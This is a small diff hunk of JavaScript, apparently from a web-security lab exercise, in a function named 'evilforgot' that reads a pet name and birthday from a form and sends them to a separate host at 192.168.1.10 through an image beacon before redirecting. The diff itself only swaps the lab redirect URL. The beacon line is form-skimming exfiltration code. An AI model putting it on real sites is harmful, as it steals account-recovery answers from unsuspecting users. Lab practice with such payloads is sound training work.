@@ -23,6 +23,6 @@ function evilforgot (){
     var pname = document.forms[0].elements[0].value;
     var birthday = document.forms[0].elements[1].value;
     new Image().src = "http://192.168.1.10/?petname="+pname+"&bday="+birthday;
-    document.location = "http://pentesteracademylab.appspot.com/lab/webapp/jfp/3";
+    document.location = "http://wtvlab.appspot.com/lab/webapp/jfp/3";
   }
 }
